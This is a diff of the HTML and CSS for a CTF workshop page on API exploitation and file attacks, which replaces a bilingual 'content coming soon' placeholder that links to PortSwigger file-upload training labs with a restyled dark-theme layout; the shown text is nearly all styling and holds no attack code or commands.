@@ -1,220 +1,1839 @@
-<!doctype html>
-<html lang="en" data-theme="light">
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
 
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>API Exploitation &amp; File Attacks Placeholder</title>
+  <title>ACM/CyberTech | API Exploitation & File Attacks · CTF Workshop</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;600;700;800&family=Inter:wght@300;400;500&display=swap"
+    rel="stylesheet">
   <style>
-    :root {
-      --bg: #f6f8fc;
-      --panel: #fff;
-      --text: #182033;
-      --muted: #5f6c8a;
-      --accent: #536dfe;
-      --line: #d9e1fb;
-      --hero-start: #4a5b83;
-      --hero-end: #3a465f;
+    /* --- identical core style (dark/light, orbs, nav, cards, etc) – kept as original --- */
+    :root[data-theme="dark"] {
+      --bg: #070d1a;
+      --bg2: #0c1526;
+      --bg3: #111e35;
+      --card: #0f1c30;
+      --card2: #142034;
+      --border: rgba(0, 200, 255, 0.12);
+      --border2: rgba(0, 200, 255, 0.25);
+      --accent: #00c8ff;
+      --accent2: #00e5c0;
+      --accent3: #3d7fff;
+      --text: #e8f4ff;
+      --text2: #8ab0cc;
+      --text3: #4a6a85;
+      --danger: #ff4466;
+      --success: #00e5c0;
+      --warn: #ffb830;
+      --glow: 0 0 30px rgba(0, 200, 255, 0.15);
+      --glow2: 0 0 60px rgba(0, 200, 255, 0.08);
+      --shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
+      --mono: 'JetBrains Mono', monospace;
+      --head: 'Syne', sans-serif;
+      --body: 'Inter', sans-serif;
     }
 
-    html[data-theme="dark"] {
-      --bg: #0a0f1a;
-      --panel: #111a2d;
-      --text: #f5f8ff;
-      --muted: #a5b4d0;
-      --accent: #00b4ff;
-      --line: #243652;
-      --hero-start: #182540;
-      --hero-end: #10192b;
+    :root[data-theme="light"] {
+      --bg: #f0f4fb;
+      --bg2: #e4ecf7;
+      --bg3: #dce6f5;
+      --card: #ffffff;
+      --card2: #f5f9ff;
+      --border: rgba(0, 100, 200, 0.12);
+      --border2: rgba(0, 100, 200, 0.3);
+      --accent: #0077cc;
+      --accent2: #009e8c;
+      --accent3: #2255cc;
+      --text: #0d1f35;
+      --text2: #3a5a7a;
+      --text3: #7a9ab5;
+      --danger: #cc2244;
+      --success: #009e8c;
+      --warn: #cc8800;
+      --glow: 0 0 30px rgba(0, 100, 200, 0.1);
+      --glow2: 0 0 60px rgba(0, 100, 200, 0.05);
+      --shadow: 0 8px 40px rgba(0, 50, 120, 0.12);
     }
 
-    * {
+    *,
+    *::before,
+    *::after {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
     }
 
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(180deg, color-mix(in srgb, var(--accent) 10%, var(--bg)) 0%, var(--bg) 100%);
+      font-family: var(--body);
+      background: var(--bg);
       color: var(--text);
-      line-height: 1.6;
+      min-height: 100vh;
+      transition: background 0.4s, color 0.4s;
+      overflow-x: hidden;
     }
 
-    .toolbar {
-      position: sticky;
-      top: 16px;
-      z-index: 10;
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 60px 60px;
+      pointer-events: none;
+      z-index: 0;
+      opacity: 0.4;
+    }
+
+    .orb {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      pointer-events: none;
+      z-index: 0;
+      animation: drift 20s infinite ease-in-out alternate;
+      opacity: 0.18;
+    }
+
+    [data-theme="light"] .orb {
+      opacity: 0.08;
+    }
+
+    .orb1 {
+      width: 600px;
+      height: 600px;
+      background: var(--accent3);
+      top: -200px;
+      left: -200px;
+    }
+
+    .orb2 {
+      width: 400px;
+      height: 400px;
+      background: var(--accent);
+      bottom: 20%;
+      right: -100px;
+      animation-delay: -7s;
+    }
+
+    .orb3 {
+      width: 300px;
+      height: 300px;
+      background: var(--accent2);
+      top: 60%;
+      left: 20%;
+      animation-delay: -14s;
+    }
+
+    @keyframes drift {
+      0% {
+        transform: translate(0, 0) scale(1)
+      }
+
+      100% {
+        transform: translate(40px, 30px) scale(1.1)
+      }
+    }
+
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
       display: flex;
-      justify-content: flex-end;
-      gap: 10px;
-      margin-bottom: 16px;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 32px;
+      height: 64px;
+      background: rgba(7, 13, 26, 0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
     }
 
-    .toolbar button {
-      min-width: 44px;
-      min-height: 44px;
-      padding: 0 14px;
-      border: 1px solid var(--line);
-      border-radius: 999px;
-      background: linear-gradient(180deg, rgba(83, 109, 254, .96), rgba(55, 77, 182, .98));
-      color: #fff;
-      font: inherit;
-      font-weight: 700;
-      cursor: pointer;
+    [data-theme="light"] nav {
+      background: rgba(240, 244, 251, 0.85);
     }
 
-    html[data-theme="dark"] .toolbar button {
-      background: linear-gradient(180deg, rgba(17, 26, 45, .96), rgba(10, 15, 26, .98));
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
     }
 
-    .shell {
-      width: min(100% - 32px, 1100px);
-      margin: 24px auto 40px;
+    .nav-logo svg {
+      width: 32px;
+      height: 32px;
     }
 
-    .hero,
-    .card {
-      background: var(--panel);
-      border: 1px solid var(--line);
-      border-radius: 24px;
-      box-shadow: 0 18px 40px rgba(32, 56, 118, .08);
-    }
-
-    .hero {
-      padding: 48px 32px;
-      text-align: center;
-      background: linear-gradient(180deg, var(--hero-start) 0%, var(--hero-end) 100%);
-      color: #fff;
-    }
-
-    .hero h1 {
-      margin: 0;
-      font-size: clamp(2.2rem, 5vw, 4rem);
-      color: #fff;
-    }
-
-    .hero p {
-      margin: 16px auto 0;
-      max-width: 760px;
-      font-size: 1.15rem;
-      color: rgba(255, 255, 255, .88);
-    }
-
-    .badge {
-      display: inline-block;
-      margin-top: 24px;
-      padding: 12px 20px;
-      border-radius: 16px;
-      background: #ffd146;
-      color: #171717;
-      font-weight: 700;
-    }
-
-    .card {
-      margin-top: 24px;
-      padding: 28px;
-    }
-
-    .card h2 {
-      margin: 0 0 12px;
-      font-size: clamp(1.7rem, 4vw, 3rem);
+    .nav-logo span {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: 1rem;
+      letter-spacing: 0.12em;
       color: var(--accent);
     }
 
-    .resource-list {
-      display: grid;
-      gap: 14px;
-      margin-top: 18px;
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
     }
 
-    .resource-link {
-      display: block;
-      padding: 18px 20px;
-      border: 1px solid var(--line);
-      border-radius: 18px;
-      background: color-mix(in srgb, var(--panel) 88%, var(--accent) 12%);
-      color: inherit;
+    .nav-badge {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      padding: 4px 10px;
+      border: 1px solid var(--border2);
+      border-radius: 20px;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+    }
+
+    .theme-btn {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 1px solid var(--border2);
+      background: transparent;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--accent);
+      font-size: 1.1rem;
+      transition: all 0.3s;
+    }
+
+    .theme-btn:hover {
+      background: var(--border);
+      box-shadow: var(--glow);
+    }
+
+    .progress-bar {
+      position: fixed;
+      top: 64px;
+      left: 0;
+      right: 0;
+      z-index: 99;
+      height: 3px;
+      background: var(--bg3);
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent3), var(--accent), var(--accent2));
+      width: 0%;
+      transition: width 0.3s;
+      box-shadow: 0 0 10px var(--accent);
+    }
+
+    main {
+      position: relative;
+      z-index: 1;
+    }
+
+    .section {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 100px 32px 80px;
+      max-width: 1100px;
+      margin: 0 auto;
+      opacity: 0;
+      transform: translateY(40px);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+
+    .section.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 100px 32px 80px;
+      max-width: 1100px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero-tag {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--accent);
+      letter-spacing: 0.2em;
+      padding: 6px 14px;
+      border: 1px solid var(--border2);
+      border-radius: 20px;
+      margin-bottom: 32px;
+      animation: fadeDown 0.8s 0.2s both;
+    }
+
+    .hero h1 {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: clamp(3rem, 8vw, 7rem);
+      line-height: 0.95;
+      letter-spacing: -0.02em;
+      color: var(--text);
+      margin-bottom: 24px;
+      animation: fadeDown 0.8s 0.4s both;
+    }
+
+    .hero h1 span {
+      color: var(--accent);
+    }
+
+    .hero-sub {
+      font-size: 1.05rem;
+      color: var(--text2);
+      max-width: 560px;
+      line-height: 1.7;
+      margin-bottom: 48px;
+      animation: fadeDown 0.8s 0.6s both;
+    }
+
+    .hero-cta {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      animation: fadeDown 0.8s 0.8s both;
+    }
+
+    .btn {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      letter-spacing: 0.1em;
+      padding: 14px 28px;
+      border-radius: 8px;
+      cursor: pointer;
+      border: none;
+      transition: all 0.3s;
       text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
     }
 
-    .resource-link strong {
+    .btn-primary {
+      background: var(--accent);
+      color: #070d1a;
+      font-weight: 700;
+    }
+
+    .btn-primary:hover {
+      box-shadow: 0 0 30px var(--accent), 0 0 60px rgba(0, 200, 255, 0.3);
+      transform: translateY(-2px);
+    }
+
+    .btn-ghost {
+      background: transparent;
+      color: var(--text);
+      border: 1px solid var(--border2);
+    }
+
+    .btn-ghost:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+      background: var(--border);
+    }
+
+    .hero-scroll {
+      margin-top: 80px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      animation: fadeDown 0.8s 1s both;
+    }
+
+    .scroll-line {
+      width: 40px;
+      height: 1px;
+      background: var(--text3);
+    }
+
+    .scroll-text {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--text3);
+      letter-spacing: 0.15em;
+    }
+
+    .sec-label {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.2em;
+      color: var(--accent);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .sec-label::before {
+      content: '';
       display: block;
-      margin-bottom: 6px;
+      width: 24px;
+      height: 1px;
+      background: var(--accent);
+    }
+
+    .sec-title {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      line-height: 1.05;
+      letter-spacing: -0.02em;
+      margin-bottom: 16px;
       color: var(--text);
     }
 
-    .resource-link span {
-      color: var(--muted);
+    .sec-sub {
+      color: var(--text2);
+      font-size: 1rem;
+      max-width: 680px;
+      line-height: 1.7;
+      margin-bottom: 48px;
     }
 
-    .card p,
-    .card li {
-      color: var(--muted);
-      font-size: 1.02rem;
+    .obj-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 20px;
     }
 
-    html[lang="ar"] .locale-en {
+    .obj-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 28px;
+      transition: all 0.3s;
+    }
+
+    .obj-card:hover {
+      border-color: var(--border2);
+      box-shadow: var(--glow), var(--shadow);
+      transform: translateY(-4px);
+    }
+
+    .obj-num {
+      font-family: var(--head);
+      font-size: 3rem;
+      font-weight: 800;
+      color: var(--accent);
+      opacity: 0.3;
+      line-height: 1;
+      margin-bottom: 12px;
+    }
+
+    .obj-title {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .obj-desc {
+      font-size: 0.88rem;
+      color: var(--text2);
+      line-height: 1.6;
+    }
+
+    .concept-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 24px;
+    }
+
+    @media(max-width: 700px) {
+      .concept-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .concept-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 32px;
+      transition: all 0.3s;
+    }
+
+    .concept-card:hover {
+      border-color: var(--border2);
+      box-shadow: var(--glow), var(--shadow);
+    }
+
+    .concept-label {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--accent);
+      letter-spacing: 0.15em;
+      margin-bottom: 12px;
+    }
+
+    .concept-title {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1.4rem;
+      margin-bottom: 16px;
+      color: var(--text);
+    }
+
+    .concept-body {
+      font-size: 0.9rem;
+      color: var(--text2);
+      line-height: 1.75;
+    }
+
+    .deep-dive {
+      margin-top: 20px;
+      border: 1px solid rgba(0, 200, 255, 0.2);
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .deep-dive-toggle {
+      width: 100%;
+      padding: 14px 20px;
+      background: rgba(0, 200, 255, 0.06);
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      letter-spacing: 0.1em;
+      color: var(--accent);
+    }
+
+    .deep-dive-toggle:hover {
+      background: rgba(0, 200, 255, 0.12);
+    }
+
+    .deep-dive-toggle .arrow {
+      transition: transform 0.3s;
+    }
+
+    .deep-dive-toggle.open .arrow {
+      transform: rotate(180deg);
+    }
+
+    .deep-dive-content {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s;
+      background: var(--card2);
+    }
+
+    .deep-dive-content.open {
+      max-height: 800px;
+    }
+
+    .deep-dive-inner {
+      padding: 20px;
+      font-size: 0.87rem;
+      color: var(--text2);
+      line-height: 1.8;
+    }
+
+    .deep-dive-inner h4 {
+      font-family: var(--head);
+      color: var(--text);
+      font-size: 0.95rem;
+      margin: 16px 0 10px;
+    }
+
+    .deep-dive-inner h4:first-child {
+      margin-top: 0;
+    }
+
+    .code-block {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-top: 24px;
+      box-shadow: var(--shadow);
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 16px;
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .code-dot.r {
+      background: #ff5f57;
+    }
+
+    .code-dot.y {
+      background: #ffbd2e;
+    }
+
+    .code-dot.g {
+      background: #28c840;
+    }
+
+    .code-title {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--text3);
+      margin-left: 6px;
+    }
+
+    .code-body {
+      padding: 20px;
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      line-height: 1.9;
+    }
+
+    .code-line {
+      display: flex;
+      gap: 16px;
+    }
+
+    .code-ln {
+      color: var(--text3);
+      min-width: 20px;
+      user-select: none;
+    }
+
+    .kw {
+      color: #ff79c6;
+    }
+
+    .prop {
+      color: var(--accent);
+    }
+
+    .val {
+      color: var(--accent2);
+    }
+
+    .cm {
+      color: var(--text3);
+      font-style: italic;
+    }
+
+    .steps-container {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .step-item {
+      display: grid;
+      grid-template-columns: 80px 1fr;
+      gap: 0 32px;
+      position: relative;
+    }
+
+    .step-item:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 39px;
+      top: 80px;
+      bottom: -20px;
+      width: 2px;
+      background: linear-gradient(180deg, var(--border2), var(--border));
+    }
+
+    .step-num-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 16px;
+    }
+
+    .step-num {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: var(--card);
+      border: 2px solid var(--border2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: 1.1rem;
+      color: var(--accent);
+      z-index: 1;
+    }
+
+    .step-item:hover .step-num {
+      background: var(--accent);
+      color: #070d1a;
+      border-color: var(--accent);
+      box-shadow: var(--glow);
+    }
+
+    .step-content {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px 28px;
+      margin-bottom: 24px;
+    }
+
+    .step-item:hover .step-content {
+      border-color: var(--border2);
+      box-shadow: var(--shadow);
+    }
+
+    .step-title {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1.25rem;
+      color: var(--text);
+      margin-bottom: 6px;
+    }
+
+    .step-tagline {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--accent2);
+      letter-spacing: 0.1em;
+      margin-bottom: 16px;
+    }
+
+    .step-list {
+      list-style: none;
+    }
+
+    .step-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 0.9rem;
+      color: var(--text2);
+      padding: 6px 0;
+    }
+
+    .step-list li::before {
+      content: '▸';
+      color: var(--accent);
+    }
+
+    .pitfall-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 20px;
+    }
+
+    .pitfall-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px;
+      border-left: 3px solid var(--danger);
+    }
+
+    .pitfall-card:hover {
+      box-shadow: 0 0 20px rgba(255, 68, 102, 0.1), var(--shadow);
+    }
+
+    .pitfall-symptom {
+      font-family: var(--mono);
+      font-size: 0.62rem;
+      color: var(--danger);
+      letter-spacing: 0.15em;
+      margin-bottom: 8px;
+    }
+
+    .pitfall-title {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1rem;
+      color: var(--text);
+      margin-bottom: 14px;
+    }
+
+    .pitfall-row {
+      font-size: 0.85rem;
+      margin-bottom: 8px;
+    }
+
+    .pitfall-row span:first-child {
+      color: var(--text3);
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      display: block;
+      margin-bottom: 2px;
+    }
+
+    .pitfall-row.fix span:first-child {
+      color: var(--success);
+    }
+
+    .quiz-score-bar {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px 28px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      margin-bottom: 24px;
+    }
+
+    .score-label {
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: var(--text2);
+    }
+
+    .score-val {
+      font-family: var(--head);
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--accent);
+    }
+
+    .score-track {
+      flex: 1;
+      height: 6px;
+      background: var(--bg3);
+      border-radius: 3px;
+    }
+
+    .score-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent3), var(--accent2));
+      border-radius: 3px;
+      width: 0%;
+    }
+
+    .quiz-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 32px;
+      margin-bottom: 20px;
+    }
+
+    .quiz-num {
+      font-family: var(--mono);
+      font-size: 0.62rem;
+      color: var(--accent);
+      letter-spacing: 0.2em;
+      margin-bottom: 12px;
+    }
+
+    .quiz-q {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: var(--text);
+      margin-bottom: 24px;
+    }
+
+    .quiz-opts {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .quiz-opt {
+      padding: 14px 18px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: var(--bg3);
+      cursor: pointer;
+      font-size: 0.9rem;
+      color: var(--text2);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+    }
+
+    .quiz-opt:hover:not(.disabled) {
+      border-color: var(--border2);
+      color: var(--text);
+      background: var(--card2);
+    }
+
+    .quiz-opt.correct {
+      border-color: var(--success);
+      background: rgba(0, 229, 192, 0.08);
+    }
+
+    .quiz-opt.wrong {
+      border-color: var(--danger);
+      background: rgba(255, 68, 102, 0.08);
+    }
+
+    .quiz-feedback {
+      margin-top: 16px;
+      padding: 14px 18px;
+      border-radius: 10px;
       display: none;
     }
 
-    html:not([lang="ar"]) .locale-ar {
-      display: none;
+    .quiz-feedback.show {
+      display: block;
     }
 
-    .locale-ar {
-      direction: rtl;
+    .quiz-feedback.correct {
+      background: rgba(0, 229, 192, 0.08);
+      border: 1px solid var(--success);
+      color: var(--accent2);
+    }
+
+    .quiz-feedback.wrong {
+      background: rgba(255, 68, 102, 0.08);
+      border: 1px solid var(--danger);
+      color: var(--danger);
+    }
+
+    .challenge-card {
+      background: var(--card);
+      border: 1px solid var(--border2);
+      border-radius: 20px;
+      padding: 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .challenge-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--accent3), var(--accent), var(--accent2));
+    }
+
+    .badge {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      padding: 5px 12px;
+      border-radius: 20px;
+      letter-spacing: 0.1em;
+    }
+
+    .badge-time {
+      background: rgba(0, 200, 255, 0.1);
+      color: var(--accent);
+      border: 1px solid var(--border2);
+    }
+
+    .badge-level {
+      background: rgba(0, 229, 192, 0.1);
+      color: var(--accent2);
+      border: 1px solid rgba(0, 229, 192, 0.3);
+    }
+
+    .challenge-task-label {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--text3);
+      letter-spacing: 0.15em;
+      margin-bottom: 10px;
+    }
+
+    .challenge-task {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1.4rem;
+      color: var(--text);
+      margin-bottom: 28px;
+    }
+
+    .success-box {
+      background: rgba(0, 229, 192, 0.06);
+      border: 1px solid rgba(0, 229, 192, 0.2);
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin-bottom: 28px;
+    }
+
+    .success-label {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--accent2);
+      letter-spacing: 0.15em;
+      margin-bottom: 8px;
+    }
+
+    .hints-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+    }
+
+    .hint-card {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+    }
+
+    .hint-num {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: 1.8rem;
+      color: var(--accent);
+      opacity: 0.3;
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+
+    .hint-text {
+      font-size: 0.87rem;
+      color: var(--text2);
+      line-height: 1.6;
+    }
+
+    .resource-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .resource-item {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 24px 28px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .resource-item:hover {
+      border-color: var(--border2);
+      box-shadow: var(--shadow);
+      transform: translateX(4px);
+    }
+
+    .resource-num {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: 2rem;
+      color: var(--accent);
+      opacity: 0.25;
+      min-width: 48px;
+    }
+
+    .resource-info h4 {
+      font-family: var(--head);
+      font-weight: 700;
+      font-size: 1rem;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+
+    .resource-info p {
+      font-size: 0.85rem;
+      color: var(--text2);
+      line-height: 1.5;
+    }
+
+    .section-nav {
+      position: fixed;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 50;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    @media(max-width:600px) {
+      .section-nav {
+        display: none
+      }
+    }
+
+    .nav-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--border2);
+      border: 1px solid var(--border2);
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .nav-dot.active {
+      background: var(--accent);
+      box-shadow: 0 0 10px var(--accent);
+      width: 8px;
+      height: 24px;
+      border-radius: 4px;
+    }
+
+    .demo-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 40px;
+      text-align: center;
+    }
+
+    .demo-big {
+      font-family: var(--head);
+      font-weight: 800;
+      font-size: clamp(4rem, 12vw, 8rem);
+      color: var(--text);
+      margin-bottom: 16px;
+    }
+
+    .demo-sub {
+      font-size: 1rem;
+      color: var(--text2);
+      margin-bottom: 36px;
+    }
+
+    .prereq-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      text-align: left;
+      margin-bottom: 28px;
+    }
+
+    @media(max-width:600px) {
+      .prereq-grid {
+        grid-template-columns: 1fr
+      }
+    }
+
+    .prereq-item {
+      background: var(--bg3);
+      border-radius: 10px;
+      padding: 16px 18px;
+    }
+
+    .prereq-key {
+      font-family: var(--mono);
+      font-size: 0.6rem;
+      color: var(--text3);
+      letter-spacing: 0.15em;
+      margin-bottom: 6px;
+    }
+
+    .prereq-val {
+      font-family: var(--mono);
+      font-size: 0.9rem;
+      color: var(--accent);
+      font-weight: 700;
+    }
+
+    .demo-script {
+      background: var(--bg3);
+      border-radius: 16px;
+      padding: 24px;
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .demo-script pre {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      color: var(--text2);
+      white-space: pre-wrap;
+    }
+
+    .fallback-note {
+      margin-top: 16px;
+      color: var(--warn);
+      font-size: 0.85rem;
+    }
+
+    .cheatsheet-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 0.75rem;
+    }
+
+    .cheatsheet-table th {
+      text-align: left;
+      color: var(--accent);
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .cheatsheet-table td {
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border);
+      color: var(--text2);
+    }
+
+    .cheatsheet-table code {
+      background: var(--bg3);
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: var(--accent2);
+    }
+
+    .upload-viz {
+      background: linear-gradient(145deg, #0f1c30, #0a1322);
+      border: 1px solid var(--border2);
+      border-radius: 20px;
+      padding: 28px;
+      margin: 20px 0;
+    }
+
+    .upload-step {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      font-family: var(--mono);
+      margin-bottom: 16px;
+    }
+
+    .step-badge {
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      background: rgba(0, 200, 255, 0.1);
+      color: var(--accent);
+      border: 1px solid var(--border2);
+      min-width: 80px;
+      text-align: center;
     }
   </style>
 </head>
 
 <body>
-  <div class="shell">
-    <div class="toolbar"><button type="button" id="langBtn">AR</button><button type="button" id="themeBtn">☾</button>
+  <div class="orb orb1"></div>
+  <div class="orb orb2"></div>
+  <div class="orb orb3"></div>
+  <div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+
+  <nav>
+    <div class="nav-logo">
+      <svg viewBox="0 0 32 32" fill="none">
+        <path d="M16 2L28 9V23L16 30L4 23V9L16 2Z" stroke="var(--accent)" stroke-width="1.5" />
+        <path d="M16 8L22 11.5V18.5L16 22L10 18.5V11.5L16 8Z" stroke="var(--accent)" stroke-width="1" />
+        <circle cx="16" cy="15" r="2.5" fill="var(--accent)" />
+      </svg>
+      <span>ACM/CYBERTECH</span>
     </div>
-    <section class="hero">
-      <h1><span class="locale-en">API Exploitation &amp; File Attacks</span><span class="locale-ar" lang="ar">استغلال
-          واجهات البرمجة وهجمات الملفات</span></h1>
-      <p class="locale-en">The full Day 5 workshop content will be released soon.</p>
-      <p class="locale-ar" lang="ar">سيتم نشر محتوى ورشة اليوم الخامس كاملًا قريبًا.</p>
-      <div class="badge"><span class="locale-en">Content releasing soon</span><span class="locale-ar" lang="ar">سيتم
-          النشر قريبًا</span></div>
-    </section>
-    <section class="card">
-      <h2><span class="locale-en">Workshop Update</span><span class="locale-ar" lang="ar">تحديث الورشة</span></h2>
-      <p class="locale-en">We are preparing the final workshop walkthrough, examples, and practice notes for students.</p>
-      <p class="locale-ar" lang="ar">نعمل حاليًا على تجهيز الشرح النهائي للورشة والأمثلة وملاحظات التدريب للطلاب.</p>
-    </section>
-    <section class="card">
-      <h2><span class="locale-en">While You Wait</span><span class="locale-ar" lang="ar">إلى أن يتم النشر</span></h2>
-      <div class="resource-list">
-        <a class="resource-link"
-          href="https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg" target="_blank"
-          rel="noopener noreferrer">
-          <strong><span class="locale-en">Core concept visual</span><span class="locale-ar" lang="ar">رسم توضيحي
-              أساسي</span></strong>
-          <span class="locale-en">Open the PortSwigger visual explanation for file upload vulnerabilities.</span>
-          <span class="locale-ar" lang="ar">افتح الرسم التوضيحي من PortSwigger لفهم ثغرات رفع الملفات بصريًا.</span>
-        </a>
-        <a class="resource-link"
-          href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload"
-          target="_blank" rel="noopener noreferrer">
